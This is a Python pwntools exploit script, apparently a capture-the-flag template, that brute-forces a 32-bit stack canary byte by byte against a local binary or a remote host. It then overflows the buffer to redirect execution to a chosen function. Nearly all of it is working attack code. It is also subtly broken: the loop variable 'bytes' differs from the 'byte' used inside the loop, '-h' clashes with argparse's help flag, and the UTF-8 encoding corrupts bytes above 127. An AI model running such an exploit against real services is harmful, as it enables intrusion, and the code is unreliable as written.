# bufferoverflow with canary
#!/usr/bin/env python3

import argparse
import pwn

pwn.context.log_level = "critical"

parser = argparse.ArgumentParser()
parser.add_argument("destination", type=str, choices={"local", "remote"})
parser.add_argument("--host", "-h", default="", type=str, required=False)
parser.add_argument("--port", "-p", default=0, type=int, required=False)
args = parser.parse_args()
elf = pwn.ELF("<file>")

offset = <offset>
new_eip = pwn.p32(elf.symbols["<func>"])
canary_value = bytearray(b"")

while len(canary_value)<4:
  print(f" trying canary index {len(canary_value)}...")
  for bytes in range(1, 256):
    payload = b"".join([b"A"*offset,
    canary_value + chr(byte).encode('utf-8'),
    b"\n"])
    
    with open("payload", "wb") as flip:
      flip.write(payload)

#g = pwn.gdb.attach(p,   # line for debugging using gdb
#    gdbscript = """
#    b *<func>
#    r < payload
#""")


    if args.destination == "local":
      p = elf.process()
    elif args.destination == "remote":
      if not args.host or not args.port:
        pwn.warning("Supply -h for host and -p for port")
        exit()
      p = pwn.remote(args.host, args.port)
    
    p.recvline().decode('utf-8')
    payload_size = str(len(payload)).encode('utf-8')
    p.sendline(payload_size)
    p.recvuntil(b"Input>") # Receive until Input> comes -- In C code
    p.sendline(payload)
    response = p.recvall().decode('utf-8')
    if "Flag?" in response: # In C code
      canary_value += chr(byte).encode('utf-8')
      print(f"leaking canary... {canary_value}")
      break


payload = b"".join([b"A"*offset,
    canary_value,
    b"A" * (16 + (4 - len(canary_value))),
    new_eip,
    b"\n"])
print(f"leaked canary... {canary_value}. Start buffer overflow")
with open("payload", "wb") as flip:
  flip.write(payload)

if args.destination == "local":
  p = elf.process()
elif args.destination == "remote":
  if not args.host or not args.port:
    pwn.warning("Supply -h for host and -p for port")
    exit()
  p = pwn.remote(args.host, args.port)

p.recvline().decode('utf-8')
payload_size = str(len(payload)).encode('utf-8')
p.sendline(payload_size)
p.recvuntil(b"Input>") # Receive until Input> comes -- In C code
p.sendline(payload)
response = p.recvall().decode('utf-8')
print(f"[!] {response=}")
